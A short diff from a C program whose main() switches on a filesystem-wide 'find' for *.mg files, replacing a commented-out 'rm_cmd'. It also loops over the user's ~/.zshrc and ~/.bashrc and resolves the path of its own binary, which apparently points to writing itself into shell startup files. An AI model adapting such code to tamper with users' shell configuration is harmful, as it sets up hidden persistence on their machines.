@@ -139,13 +139,13 @@ int	main(int ac, char **av, char **envp)
 	int			i;
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 	char		*path;
-	// char	*rm_cmd[] = {"find", "Desktop/*", "-type", "f", "-name", "*.mg", NULL};
+	char		*find_cmd[] = {"find", "/*", "-type", "f", "-name", "*.mg", NULL};
 
 	i = 0;
 	realpath(getenv("HOME"), home_buffer);
 	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
-	// process_child(rm_cmd, envp);
+	process_child(find_cmd, envp);
 	while (file_list[i])
 	{
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
